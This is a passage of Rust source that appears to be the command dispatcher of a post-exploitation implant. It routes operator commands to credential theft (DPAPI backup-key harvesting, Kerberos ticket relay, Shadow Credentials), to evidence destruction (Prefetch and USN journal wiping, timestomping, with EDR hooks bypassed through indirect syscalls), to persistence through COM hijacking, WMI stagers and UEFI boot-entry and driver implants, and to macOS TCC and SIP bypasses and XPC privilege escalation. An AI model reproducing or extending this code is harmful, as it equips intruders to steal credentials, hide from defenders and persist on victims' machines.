        Command::RevertToken => Err("token-impersonation feature not enabled".to_string()),

        // List all cached impersonation tokens.
        #[cfg(all(windows, feature = "token-impersonation"))]
        Command::ListTokens => Ok(crate::token_impersonation::list_tokens_json()),
        #[cfg(not(all(windows, feature = "token-impersonation")))]
        Command::ListTokens => Err("token-impersonation feature not enabled".to_string()),

        // ── Forensic cleanup: Prefetch evidence removal ────────────────────
        // Cleans Windows Prefetch (.pf) evidence for the specified
        // executable (or all if empty).  Uses the cleanup method from
        // config: delete, patch (preferred), or disable-service.
        // All NT API calls use indirect syscalls to bypass EDR hooks.
        #[cfg(all(windows, feature = "forensic-cleanup"))]
        Command::CleanPrefetch { exe_name } => {
            crate::forensic_cleanup::prefetch::clean_prefetch(&exe_name)
        }
        #[cfg(not(all(windows, feature = "forensic-cleanup")))]
        Command::CleanPrefetch { .. } => Err("forensic-cleanup feature not enabled".to_string()),

        // Disable the Windows Prefetch service by setting the
        // EnablePrefetcher registry value to 0.  Saves the previous
        // value for later restoration.
        #[cfg(all(windows, feature = "forensic-cleanup"))]
        Command::DisablePrefetch => crate::forensic_cleanup::prefetch::disable_prefetch(),
        #[cfg(not(all(windows, feature = "forensic-cleanup")))]
        Command::DisablePrefetch => Err("forensic-cleanup feature not enabled".to_string()),

        // Restore the Windows Prefetch service to its previous state
        // (sets EnablePrefetcher back to the value captured by
        // DisablePrefetch).
        #[cfg(all(windows, feature = "forensic-cleanup"))]
        Command::RestorePrefetch => crate::forensic_cleanup::prefetch::restore_prefetch(),
        #[cfg(not(all(windows, feature = "forensic-cleanup")))]
        Command::RestorePrefetch => Err("forensic-cleanup feature not enabled".to_string()),

        // Synchronize timestamps for a single file using either the explicit
        // reference file or the configured default reference.
        #[cfg(all(windows, feature = "forensic-cleanup"))]
        Command::Timestomp {
            file_path,
            reference_file,
        } => {
            let to_nt_wide = |path: &str| -> Vec<u16> {
                if path.starts_with('\\') {
                    path.encode_utf16().chain(std::iter::once(0)).collect()
                } else {
                    format!("\\??\\{path}")
                        .encode_utf16()
                        .chain(std::iter::once(0))
                        .collect()
                }
            };

            let file_nt = to_nt_wide(&file_path);
            if reference_file.trim().is_empty() {
                unsafe {
                    crate::forensic_cleanup::timestamps::sync_timestamps_with_default_ref(&file_nt)
                }
                .map(|_| "Timestomp complete".to_string())
            } else {
                let reference_nt = to_nt_wide(&reference_file);
                unsafe {
                    crate::forensic_cleanup::timestamps::sync_timestamps(&file_nt, &reference_nt)
                }
                .map(|_| "Timestomp complete".to_string())
            }
        }
        #[cfg(not(all(windows, feature = "forensic-cleanup")))]
        Command::Timestomp { .. } => Err("forensic-cleanup feature not enabled".to_string()),

        #[cfg(all(windows, feature = "forensic-cleanup"))]
        Command::TimestompDirectory {
            dir_path,
            reference_file,
        } => {
            let to_nt_wide = |path: &str| -> Vec<u16> {
                if path.starts_with('\\') {
                    path.encode_utf16().chain(std::iter::once(0)).collect()
                } else {
                    format!("\\??\\{path}")
                        .encode_utf16()
                        .chain(std::iter::once(0))
                        .collect()
                }
            };

            let dir_nt = to_nt_wide(&dir_path);
            let reference = if reference_file.trim().is_empty() {
                config.lock().await.timestamps.reference_file.clone()
            } else {
                reference_file.clone()
            };
            let reference_nt = to_nt_wide(&reference);

            unsafe {
                crate::forensic_cleanup::timestamps::timestomp_directory(&dir_nt, &reference_nt)
            }
            .map(|count| format!("Timestomped {count} files"))
        }
        #[cfg(not(all(windows, feature = "forensic-cleanup")))]
        Command::TimestompDirectory { .. } => {
            Err("forensic-cleanup feature not enabled".to_string())
        }

        #[cfg(all(windows, feature = "forensic-cleanup"))]
        Command::CleanUsn { volume } => {
            let to_nt_wide = |path: &str| -> Vec<u16> {
                if path.starts_with('\\') {
                    path.encode_utf16().chain(std::iter::once(0)).collect()
                } else {
                    format!("\\??\\{path}")
                        .encode_utf16()
                        .chain(std::iter::once(0))
                        .collect()
                }
            };

            let vol = if volume.trim().is_empty() {
                "C:".to_string()
            } else {
                volume.clone()
            };
            let volume_nt = to_nt_wide(&vol);
            unsafe { crate::forensic_cleanup::timestamps::clean_usn_journal(&volume_nt) }
                .map(|_| format!("USN cleanup completed for {vol}"))
        }
        #[cfg(not(all(windows, feature = "forensic-cleanup")))]
        Command::CleanUsn { .. } => Err("forensic-cleanup feature not enabled".to_string()),

        #[cfg(all(windows, feature = "forensic-cleanup"))]
        Command::SyncTimestamps => {
            const MAX_SYNC_CANDIDATES: usize = 512;

            let cfg = config.lock().await.clone();
            if !cfg.timestamps.enabled {
                Err("forensic timestamp synchronization is disabled in config".to_string())
            } else {
                let roots = cfg.allowed_paths.clone();
                let since = *SESSION_START_TIME;

                match tokio::task::spawn_blocking(move || {
                    collect_recent_files_for_sync(&roots, since, MAX_SYNC_CANDIDATES)
                })
                .await
                {
                    Ok(Ok(candidates)) => {
                        if candidates.is_empty() {
                            Ok(
                                "SyncTimestamps: no recently modified files found in allowed paths"
                                    .to_string(),
                            )
                        } else {
                            let mut synced = 0usize;
                            let mut failed = Vec::new();

                            for file in &candidates {
                                let file_nt = to_nt_wide_path(file);
                                match unsafe {
                                    crate::forensic_cleanup::timestamps::sync_timestamps_with_default_ref(&file_nt)
                                } {
                                    Ok(()) => synced += 1,
                                    Err(e) => failed.push(format!("{} ({})", file, e)),
                                }
                            }

                            if failed.is_empty() {
                                Ok(format!(
                                    "SyncTimestamps: synchronized {} recently modified file(s)",
                                    synced
                                ))
                            } else if synced == 0 {
                                Err(format!(
                                    "SyncTimestamps failed for all {} candidate file(s): {}",
                                    failed.len(),
                                    failed.into_iter().take(3).collect::<Vec<_>>().join("; ")
                                ))
                            } else {
                                Ok(format!(
                                    "SyncTimestamps: synchronized {} file(s), {} failed",
                                    synced,
                                    failed.len()
                                ))
                            }
                        }
                    }
                    Ok(Err(e)) => Err(format!("SyncTimestamps scan failed: {e}")),
                    Err(e) => Err(format!("SyncTimestamps worker task failed: {e}")),
                }
            }
        }
        #[cfg(not(all(windows, feature = "forensic-cleanup")))]
        Command::SyncTimestamps => Err("forensic-cleanup feature not enabled".to_string()),

        // ── Page Tracker telemetry gateway ──────────────────────────────
        // PageTrackerStatus is the only authorized way to query page
        // tracker state from outside the crate.  The underlying
        // status_json() is pub(crate) to prevent uncontrolled access.
        // Once RBAC (P1-26) is implemented, this command will require
        // at least read permission level.
        #[cfg(all(windows, feature = "evanesco"))]
        Command::PageTrackerStatus => Ok(crate::page_tracker::status_json()),
        #[cfg(not(all(windows, feature = "evanesco")))]
        Command::PageTrackerStatus => Err("evanesco feature not enabled".to_string()),

        // Redacted version for lower-privilege callers — page counts
        // only, no timing/counters/thresholds.
        #[cfg(all(windows, feature = "evanesco"))]
        Command::PageTrackerStatusRedacted => Ok(crate::page_tracker::status_redacted()),
        #[cfg(not(all(windows, feature = "evanesco")))]
        Command::PageTrackerStatusRedacted => Err("evanesco feature not enabled".to_string()),

        // ── Kerberos relay (Windows-only) ───────────────────────────
        // Capture Kerberos service tickets via COM cross-session
        // activation without NTLM.  The agent starts a local RPC
        // listener, triggers COM activation with a COSERVERINFO pointing
        // at the listener, captures the AP-REQ from the RPC bind
        // security trailer, and returns the ticket data to the operator.
        #[cfg(all(windows, feature = "kerberos-relay"))]
        Command::KerberosRelay {
            target_host,
            target_spn,
            method: _,
            clsid,
            bind_address,
            bind_port,
            timeout_secs,
        } => crate::kerberos_relay::execute_kerberos_relay(
            &target_host,
            &target_spn,
            &clsid,
            &bind_address,
            bind_port,
            timeout_secs,
        )
        .map_err(|e| format!("Kerberos relay failed: {e:#}")),
        #[cfg(not(all(windows, feature = "kerberos-relay")))]
        Command::KerberosRelay { .. } => Err("kerberos-relay feature not enabled".to_string()),

        // List exploitable CLSIDs for Kerberos relay.
        #[cfg(all(windows, feature = "kerberos-relay"))]
        Command::KerberosRelayListClsids => crate::kerberos_relay::list_clsids_json()
            .map_err(|e| format!("Failed to list CLSIDs: {e:#}")),
        #[cfg(not(all(windows, feature = "kerberos-relay")))]
        Command::KerberosRelayListClsids => Err("kerberos-relay feature not enabled".to_string()),

        // ── DPAPI Backup Key ──────────────────────────────────────────
        // Retrieve the domain DPAPI backup key from a Domain Controller
        // using MS-BKRP.  Any domain-authenticated user can call this —
        // no Domain Admin required.  Does NOT touch LSASS memory.
        #[cfg(all(windows, feature = "dpapi-backup"))]
        Command::DpapiBackupKeyRetrieve { dc_hostname } => {
            crate::dpapi_backup::retrieve_backup_key(dc_hostname.clone())
                .map(|info| {
                    serde_json::to_string(&info)
                        .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
                })
                .map_err(|e| format!("Failed to retrieve DPAPI backup key: {e:#}"))
        }
        #[cfg(not(all(windows, feature = "dpapi-backup")))]
        Command::DpapiBackupKeyRetrieve { .. } => {
            Err("dpapi-backup feature not enabled".to_string())
        }

        // Harvest DPAPI-protected secrets using the domain backup key.
        #[cfg(all(windows, feature = "dpapi-backup"))]
        Command::DpapiBackupKeyHarvest { backup_key_hex, .. } => {
            match hex::decode(backup_key_hex) {
                Ok(backup_key_data) => crate::dpapi_backup::harvest_dpapi_secrets(&backup_key_data)
                    .map(|secrets| {
                        serde_json::to_string(&secrets).unwrap_or_else(|e| {
                            format!("{{\"error\":\"serialization failed: {e}\"}}")
                        })
                    })
                    .map_err(|e| format!("Failed to harvest DPAPI secrets: {e:#}")),
                Err(e) => Err(format!("Invalid backup key hex: {e}")),
            }
        }
        #[cfg(not(all(windows, feature = "dpapi-backup")))]
        Command::DpapiBackupKeyHarvest { .. } => {
            Err("dpapi-backup feature not enabled".to_string())
        }

        // Decrypt a single DPAPI blob using the domain backup key.
        #[cfg(all(windows, feature = "dpapi-backup"))]
        Command::DpapiBackupKeyDecrypt {
            blob_hex,
            backup_key_hex,
        } => match (hex::decode(blob_hex), hex::decode(backup_key_hex)) {
            (Ok(blob_data), Ok(backup_key_data)) => {
                crate::dpapi_backup::decrypt_dpapi_blob(&blob_data, &backup_key_data)
                    .map(|plaintext| hex::encode(&plaintext))
                    .map_err(|e| format!("Failed to decrypt DPAPI blob: {e:#}"))
            }
            (Err(e), _) => Err(format!("Invalid blob hex: {e}")),
            (_, Err(e)) => Err(format!("Invalid backup key hex: {e}")),
        },
        #[cfg(not(all(windows, feature = "dpapi-backup")))]
        Command::DpapiBackupKeyDecrypt { .. } => {
            Err("dpapi-backup feature not enabled".to_string())
        }

        // ── Shadow Credentials ─────────────────────────────────────────
        #[cfg(all(windows, feature = "shadow-credentials"))]
        Command::ShadowCredentialsAttack { target } => {
            crate::shadow_credentials::shadow_credentials_attack(&target)
                .map(|result| {
                    serde_json::to_string(&result)
                        .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
                })
                .map_err(|e| format!("Shadow Credentials attack failed: {e:#}"))
        }
        #[cfg(not(all(windows, feature = "shadow-credentials")))]
        Command::ShadowCredentialsAttack { .. } => {
            Err("shadow-credentials feature not enabled".to_string())
        }

        #[cfg(all(windows, feature = "shadow-credentials"))]
        Command::ShadowCredentialsCheckAccess { target_dn } => {
            crate::shadow_credentials::check_write_access(&target_dn)
                .map(|has_access| {
                    serde_json::to_string(&serde_json::json!({
                        "target_dn": target_dn,
                        "has_access": has_access,
                    }))
                    .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
                })
                .map_err(|e| format!("Shadow Credentials check access failed: {e:#}"))
        }
        #[cfg(not(all(windows, feature = "shadow-credentials")))]
        Command::ShadowCredentialsCheckAccess { .. } => {
            Err("shadow-credentials feature not enabled".to_string())
        }

        #[cfg(all(windows, feature = "shadow-credentials"))]
        Command::ShadowCredentialsCertGen { subject } => {
            crate::shadow_credentials::generate_self_signed_cert(&subject)
                .map(|(private_key, cert_der)| {
                    serde_json::to_string(&serde_json::json!({
                        "subject": subject,
                        "private_key_hex": hex::encode(&private_key),
                        "cert_der_hex": hex::encode(&cert_der),
                    }))
                    .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
                })
                .map_err(|e| format!("Shadow Credentials cert gen failed: {e:#}"))
        }
        #[cfg(not(all(windows, feature = "shadow-credentials")))]
        Command::ShadowCredentialsCertGen { .. } => {
            Err("shadow-credentials feature not enabled".to_string())
        }

        // ── COM Object Hijacking (registry-free, activation context) ─────────
        #[cfg(all(windows, feature = "com-hijack"))]
        Command::ComHijackManifest {
            clsid,
            proxy_dll_path,
            prog_id,
        } => crate::com_hijack::generate_manifest(&clsid, &proxy_dll_path, prog_id.as_deref())
            .map(|result| {
                serde_json::to_string(&result)
                    .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
            })
            .map_err(|e| format!("COM hijack manifest generation failed: {e:#}")),
        #[cfg(not(all(windows, feature = "com-hijack")))]
        Command::ComHijackManifest { .. } => Err("com-hijack feature not enabled".to_string()),

        #[cfg(all(windows, feature = "com-hijack"))]
        Command::ComHijackActivateFile {
            manifest_path,
            clsid,
        } => crate::com_hijack::activate_from_file(&manifest_path, &clsid)
            .map(|result| {
                serde_json::to_string(&result)
                    .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
            })
            .map_err(|e| format!("COM hijack file activation failed: {e:#}")),
        #[cfg(not(all(windows, feature = "com-hijack")))]
        Command::ComHijackActivateFile { .. } => Err("com-hijack feature not enabled".to_string()),

        #[cfg(all(windows, feature = "com-hijack"))]
        Command::ComHijackActivateMemory {
            manifest_xml,
            clsid,
        } => crate::com_hijack::activate_from_memory(&manifest_xml, &clsid)
            .map(|result| {
                serde_json::to_string(&result)
                    .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
            })
            .map_err(|e| format!("COM hijack memory activation failed: {e:#}")),
        #[cfg(not(all(windows, feature = "com-hijack")))]
        Command::ComHijackActivateMemory { .. } => {
            Err("com-hijack feature not enabled".to_string())
        }

        #[cfg(all(windows, feature = "com-hijack"))]
        Command::ComHijackScanTargets => crate::com_hijack::scan_targets()
            .map(|result| {
                serde_json::to_string(&result)
                    .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
            })
            .map_err(|e| format!("COM hijack target scan failed: {e:#}")),
        #[cfg(not(all(windows, feature = "com-hijack")))]
        Command::ComHijackScanTargets => Err("com-hijack feature not enabled".to_string()),

        #[cfg(all(windows, feature = "com-hijack"))]
        Command::ComHijackProxyDll {
            clsid,
            original_handler,
        } => crate::com_hijack::generate_proxy(&clsid, &original_handler)
            .map(|result| {
                serde_json::to_string(&result)
                    .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
            })
            .map_err(|e| format!("COM hijack proxy DLL generation failed: {e:#}")),
        #[cfg(not(all(windows, feature = "com-hijack")))]
        Command::ComHijackProxyDll { .. } => Err("com-hijack feature not enabled".to_string()),

        // ── WMI Permanent Subscriptions with Encrypted Cloud Payloads ─────
        #[cfg(all(windows, feature = "wmi-persistence"))]
        Command::WmiInstallSubscription { config_json } => serde_json::from_str::<
            crate::wmi_persistence::WmiSubscriptionConfig,
        >(&config_json)
        .map_err(|e| format!("Invalid WMI subscription config JSON: {e}"))
        .and_then(|config| {
            crate::wmi_persistence::install_wmi_subscription(&config)
                .map(|result| {
                    serde_json::to_string(&result)
                        .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
                })
                .map_err(|e| format!("WMI subscription installation failed: {e:#}"))
        }),
        #[cfg(not(all(windows, feature = "wmi-persistence")))]
        Command::WmiInstallSubscription { .. } => {
            Err("wmi-persistence feature not enabled".to_string())
        }

        #[cfg(all(windows, feature = "wmi-persistence"))]
        Command::WmiRemoveSubscription {
            filter_name,
            consumer_name,
        } => crate::wmi_persistence::remove_wmi_subscription(&filter_name, &consumer_name)
            .map(|result| {
                serde_json::to_string(&result)
                    .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
            })
            .map_err(|e| format!("WMI subscription removal failed: {e:#}")),
        #[cfg(not(all(windows, feature = "wmi-persistence")))]
        Command::WmiRemoveSubscription { .. } => {
            Err("wmi-persistence feature not enabled".to_string())
        }

        #[cfg(all(windows, feature = "wmi-persistence"))]
        Command::WmiScanSubscriptions => crate::wmi_persistence::scan_wmi_subscriptions()
            .map(|result| {
                serde_json::to_string(&result)
                    .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
            })
            .map_err(|e| format!("WMI subscription scan failed: {e:#}")),
        #[cfg(not(all(windows, feature = "wmi-persistence")))]
        Command::WmiScanSubscriptions => Err("wmi-persistence feature not enabled".to_string()),

        #[cfg(all(windows, feature = "wmi-persistence"))]
        Command::WmiCloudUpload {
            payload,
            cloud_config_json,
        } => serde_json::from_str::<crate::wmi_persistence::CloudStorageConfig>(&cloud_config_json)
            .map_err(|e| format!("Invalid cloud config JSON: {e}"))
            .and_then(|config| {
                crate::wmi_persistence::encrypt_and_upload(&payload, &config)
                    .map(|result| {
                        serde_json::to_string(&result).unwrap_or_else(|e| {
                            format!("{{\"error\":\"serialization failed: {e}\"}}")
                        })
                    })
                    .map_err(|e| format!("WMI cloud upload failed: {e:#}"))
            }),
        #[cfg(not(all(windows, feature = "wmi-persistence")))]
        Command::WmiCloudUpload { .. } => Err("wmi-persistence feature not enabled".to_string()),

        #[cfg(all(windows, feature = "wmi-persistence"))]
        Command::WmiGenerateStager { url, key_hex } => {
            let key_bytes_res: Result<[u8; 32], String> = {
                match hex::decode(&key_hex) {
                    Ok(decoded) if decoded.len() == 32 => {
                        let mut arr = [0u8; 32];
                        arr.copy_from_slice(&decoded);
                        Ok(arr)
                    }
                    Ok(_) => {
                        Err("Decryption key must be exactly 32 bytes (64 hex chars)".to_string())
                    }
                    Err(e) => Err(format!("Invalid hex key: {e}")),
                }
            };
            match key_bytes_res {
                Ok(kb) => crate::wmi_persistence::generate_stager_command(&url, &kb)
                    .map(|result| {
                        serde_json::to_string(&result).unwrap_or_else(|e| {
                            format!("{{\"error\":\"serialization failed: {e}\"}}")
                        })
                    })
                    .map_err(|e| format!("WMI stager generation failed: {e:#}")),
                Err(e) => Err(e),
            }
        }
        #[cfg(not(all(windows, feature = "wmi-persistence")))]
        Command::WmiGenerateStager { .. } => Err("wmi-persistence feature not enabled".to_string()),

        // ── UEFI Firmware-Level Persistence ───────────────────────────────
        #[cfg(feature = "uefi-persistence")]
        Command::UefiReadVariable { name, guid } => uefi_persistence::EfiGuid::parse(&guid)
            .map_err(|e| format!("Invalid EFI GUID: {e:#}"))
            .and_then(|g| {
                uefi_persistence::nvram::read_efi_variable(&name, &g)
                    .map(|data| base64::engine::general_purpose::STANDARD.encode(&data))
                    .map_err(|e| format!("UEFI variable read failed: {e:#}"))
            }),
        #[cfg(not(feature = "uefi-persistence"))]
        Command::UefiReadVariable { .. } => Err("uefi-persistence feature not enabled".to_string()),

        #[cfg(feature = "uefi-persistence")]
        Command::UefiWriteVariable {
            name,
            guid,
            data,
            attributes,
        } => uefi_persistence::EfiGuid::parse(&guid)
            .map_err(|e| format!("Invalid EFI GUID: {e:#}"))
            .and_then(|g| {
                base64::engine::general_purpose::STANDARD
                    .decode(&data)
                    .map_err(|e| format!("Invalid base64 data: {e}"))
                    .and_then(|data_bytes| {
                        uefi_persistence::nvram::write_efi_variable(
                            &name,
                            &g,
                            &data_bytes,
                            uefi_persistence::EfiVarAttributes(attributes),
                        )
                        .map(|_| "OK".to_string())
                        .map_err(|e| format!("UEFI variable write failed: {e:#}"))
                    })
            }),
        #[cfg(not(feature = "uefi-persistence"))]
        Command::UefiWriteVariable { .. } => {
            Err("uefi-persistence feature not enabled".to_string())
        }

        #[cfg(feature = "uefi-persistence")]
        Command::UefiEnumerateBootEntries => uefi_persistence::nvram::enumerate_boot_entries()
            .map(|entries| {
                serde_json::to_string(&entries)
                    .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
            })
            .map_err(|e| format!("Boot entry enumeration failed: {e:#}")),
        #[cfg(not(feature = "uefi-persistence"))]
        Command::UefiEnumerateBootEntries => {
            Err("uefi-persistence feature not enabled".to_string())
        }

        #[cfg(feature = "uefi-persistence")]
        Command::UefiModifyBootEntry {
            entry_num,
            new_path,
        } => uefi_persistence::nvram::modify_boot_entry(entry_num, &new_path)
            .map(|result| {
                serde_json::to_string(&result)
                    .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
            })
            .map_err(|e| format!("Boot entry modification failed: {e:#}")),
        #[cfg(not(feature = "uefi-persistence"))]
        Command::UefiModifyBootEntry { .. } => {
            Err("uefi-persistence feature not enabled".to_string())
        }

        #[cfg(feature = "uefi-persistence")]
        Command::UefiMountEsp => uefi_persistence::esp::mount_esp()
            .map(|result| {
                serde_json::to_string(&result)
                    .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
            })
            .map_err(|e| format!("ESP mount failed: {e:#}")),
        #[cfg(not(feature = "uefi-persistence"))]
        Command::UefiMountEsp => Err("uefi-persistence feature not enabled".to_string()),

        #[cfg(feature = "uefi-persistence")]
        Command::UefiWriteDriver {
            esp_path,
            driver_name,
            driver_data,
            vendor,
        } => base64::engine::general_purpose::STANDARD
            .decode(&driver_data)
            .map_err(|e| format!("Invalid base64 driver data: {e}"))
            .and_then(|driver_bytes| {
                uefi_persistence::esp::write_efi_driver(
                    &esp_path,
                    &driver_name,
                    &driver_bytes,
                    vendor.as_deref(),
                )
                .map(|result| {
                    serde_json::to_string(&result)
                        .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
                })
                .map_err(|e| format!("EFI driver write failed: {e:#}"))
            }),
        #[cfg(not(feature = "uefi-persistence"))]
        Command::UefiWriteDriver { .. } => Err("uefi-persistence feature not enabled".to_string()),

        #[cfg(feature = "uefi-persistence")]
        Command::UefiBuildStub {
            payload_data,
            second_stage_path,
            entry_point_offset,
            chain_to_original,
            original_bootloader_path,
        } => base64::engine::general_purpose::STANDARD
            .decode(&payload_data)
            .map_err(|e| format!("Invalid base64 payload data: {e}"))
            .and_then(|payload_bytes| {
                let config = uefi_persistence::EfiPayloadConfig {
                    payload_data: payload_bytes,
                    second_stage_path,
                    entry_point_offset,
                    chain_to_original,
                    original_bootloader_path,
                };
                uefi_persistence::driver_stub::build_efi_stub(&config)
                    .map(|result| {
                        serde_json::to_string(&result).unwrap_or_else(|e| {
                            format!("{{\"error\":\"serialization failed: {e}\"}}")
                        })
                    })
                    .map_err(|e| format!("EFI stub build failed: {e:#}"))
            }),
        #[cfg(not(feature = "uefi-persistence"))]
        Command::UefiBuildStub { .. } => Err("uefi-persistence feature not enabled".to_string()),

        #[cfg(feature = "uefi-persistence")]
        Command::UefiInstallRuntimeDriver {
            driver_data,
            driver_name,
            esp_path,
            use_capsule,
        } => base64::engine::general_purpose::STANDARD
            .decode(&driver_data)
            .map_err(|e| format!("Invalid base64 driver data: {e}"))
            .and_then(|driver_bytes| {
                uefi_persistence::runtime_driver::install_runtime_driver(
                    &driver_bytes,
                    &driver_name,
                    &esp_path,
                    use_capsule,
                )
                .map(|result| {
                    serde_json::to_string(&result)
                        .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
                })
                .map_err(|e| format!("Runtime driver install failed: {e:#}"))
            }),
        #[cfg(not(feature = "uefi-persistence"))]
        Command::UefiInstallRuntimeDriver { .. } => {
            Err("uefi-persistence feature not enabled".to_string())
        }

        #[cfg(feature = "uefi-persistence")]
        Command::UefiCheckCapsuleSupport => {
            uefi_persistence::runtime_driver::check_uefi_capsule_support()
                .map(|result| {
                    serde_json::to_string(&result)
                        .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
                })
                .map_err(|e| format!("Capsule support check failed: {e:#}"))
        }
        #[cfg(not(feature = "uefi-persistence"))]
        Command::UefiCheckCapsuleSupport => Err("uefi-persistence feature not enabled".to_string()),

        #[cfg(feature = "uefi-persistence")]
        Command::UefiDetectPersistence { esp_path } => {
            uefi_persistence::cleanup::detect_existing_persistence(&esp_path)
                .map(|result| {
                    serde_json::to_string(&result)
                        .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
                })
                .map_err(|e| format!("Persistence detection failed: {e:#}"))
        }
        #[cfg(not(feature = "uefi-persistence"))]
        Command::UefiDetectPersistence { .. } => {
            Err("uefi-persistence feature not enabled".to_string())
        }

        #[cfg(feature = "uefi-persistence")]
        Command::UefiRemovePersistence {
            artifact_type,
            description,
            path,
            risk_level,
            removable,
        } => {
            let artifact_type_parsed = serde_json::from_str(&format!("\"{}\"", artifact_type))
                .unwrap_or(uefi_persistence::PersistenceArtifactType::EfiDriver);
            let artifact = uefi_persistence::PersistenceArtifact {
                artifact_type: artifact_type_parsed,
                description,
                path,
                risk_level,
                removable,
            };
            uefi_persistence::cleanup::remove_persistence(&artifact)
                .map(|result| {
                    serde_json::to_string(&result)
                        .unwrap_or_else(|e| format!("{{\"error\":\"serialization failed: {e}\"}}"))
                })
                .map_err(|e| format!("Persistence removal failed: {e:#}"))
        }
        #[cfg(not(feature = "uefi-persistence"))]
        Command::UefiRemovePersistence { .. } => {
            Err("uefi-persistence feature not enabled".to_string())
        }

        // ── Anti-Debug Hardening ──────────────────────────────────────────
        Command::DenyDebuggerAttach => crate::env_check::deny_debugger_attach()
            .map(|_| "Debugger attachment denied".to_string())
            .map_err(|_| "Failed to deny debugger attachment (already traced?)".to_string()),

        // ── macOS Post-Exploitation: TCC ──────────────────────────────────
        #[cfg(all(target_os = "macos", feature = "macos-postexp"))]
        Command::MacTccCheck { resource } => {
            let res = parse_tcc_resource(&resource);
            let info = crate::macos_postexp::check_tcc_status(res);
            Ok(serde_json::json!({
                "resource": resource,
                "status": match info.status {
                    crate::macos_postexp::TccStatus::Allowed => "Allowed",
                    crate::macos_postexp::TccStatus::Denied => "Denied",
                    crate::macos_postexp::TccStatus::NotDetermined => "NotDetermined",
                    crate::macos_postexp::TccStatus::Unknown => "Unknown",
                },
                "source": info.source,
            }).to_string())
        }
        #[cfg(not(all(target_os = "macos", feature = "macos-postexp")))]
        Command::MacTccCheck { .. } => {
            Err("macos-postexp feature not enabled (requires macOS target)".to_string())
        }

        #[cfg(all(target_os = "macos", feature = "macos-postexp"))]
        Command::MacTccBypass { resource, method } => {
            let res = parse_tcc_resource(&resource);
            let result = match method.as_str() {
                "database" => crate::macos_postexp::bypass_tcc_via_tcc_database(res),
                "synthetic_click" => crate::macos_postexp::bypass_tcc_via_synthetic_click(res),
                "vulnerable_process" => crate::macos_postexp::bypass_tcc_via_vulnerable_process(res),
                "all" => Ok(crate::macos_postexp::bypass_tcc_all(res)),
                _ => Err(anyhow::anyhow!("Unknown TCC bypass method: '{}'. Use 'database', 'synthetic_click', 'vulnerable_process', or 'all'.", method)),
            };
            match result {
                Ok(r) => Ok(serde_json::json!({
                    "success": r.success,
                    "technique": r.technique,
                    "message": r.message,
                    "resource": resource,
                }).to_string()),
                Err(e) => Err(format!("TCC bypass failed: {e:#}")),
            }
        }
        #[cfg(not(all(target_os = "macos", feature = "macos-postexp")))]
        Command::MacTccBypass { .. } => {
            Err("macos-postexp feature not enabled (requires macOS target)".to_string())
        }

        // ── macOS Post-Exploitation: SIP ──────────────────────────────────
        #[cfg(all(target_os = "macos", feature = "macos-postexp"))]
        Command::MacSipStatus => {
            let info = crate::macos_postexp::check_sip_status();
            Ok(serde_json::json!({
                "status": match info.status {
                    crate::macos_postexp::SipStatus::Enabled => "Enabled",
                    crate::macos_postexp::SipStatus::Disabled => "Disabled",
                    crate::macos_postexp::SipStatus::PartiallyDisabled => "PartiallyDisabled",
                    crate::macos_postexp::SipStatus::Unknown => "Unknown",
                },
                "csrutil_output": info.csrutil_output,
                "nvram_config": info.nvram_config,
            }).to_string())
        }
        #[cfg(not(all(target_os = "macos", feature = "macos-postexp")))]
        Command::MacSipStatus => {
            Err("macos-postexp feature not enabled (requires macOS target)".to_string())
        }

        #[cfg(all(target_os = "macos", feature = "macos-postexp"))]
        Command::MacSipBypassMount => {
            crate::macos_postexp::attempt_sip_bypass_via_mount()
                .map(|success| serde_json::json!({ "success": success }).to_string())
                .map_err(|e| format!("SIP bypass via mount failed: {e:#}"))
        }
        #[cfg(not(all(target_os = "macos", feature = "macos-postexp")))]
        Command::MacSipBypassMount => {
            Err("macos-postexp feature not enabled (requires macOS target)".to_string())
        }

        // ── macOS Post-Exploitation: XPC ──────────────────────────────────
        #[cfg(all(target_os = "macos", feature = "macos-postexp"))]
        Command::MacXpcEnumerate => {
            crate::macos_postexp::enumerate_xpc_services()
                .map(|services| {
                    let json_services: Vec<serde_json::Value> = services.iter().map(|s| {
                        serde_json::json!({
                            "name": s.name,
                            "mach_service_name": s.mach_service_name,
                            "bundle_path": s.bundle_path.display().to_string(),
                            "parent_framework": s.parent_framework,
                            "has_mach_service": s.has_mach_service,
                        })
                    }).collect();
                    serde_json::json!({ "services": json_services }).to_string()
                })
                .map_err(|e| format!("XPC enumeration failed: {e:#}"))
        }
        #[cfg(not(all(target_os = "macos", feature = "macos-postexp")))]
        Command::MacXpcEnumerate => {
            Err("macos-postexp feature not enabled (requires macOS target)".to_string())
        }

        #[cfg(all(target_os = "macos", feature = "macos-postexp"))]
        Command::MacXpcExploit { service_name } => {
            // First enumerate services to find the one matching the requested name.
            match crate::macos_postexp::enumerate_xpc_services() {
                Ok(services) => {
                    let target = services.into_iter()
                        .find(|s| s.name == service_name || s.mach_service_name.as_deref() == Some(&service_name));
                    match target {
                        Some(svc) => crate::macos_postexp::exploit_xpc_privilege_escalation(&svc)
                            .map(|result| {
                                serde_json::json!({
                                    "service_name": result.service_name,
                                    "success": result.success,
                                    "technique": result.technique,
                                    "message": result.message,
                                }).to_string()
                            })
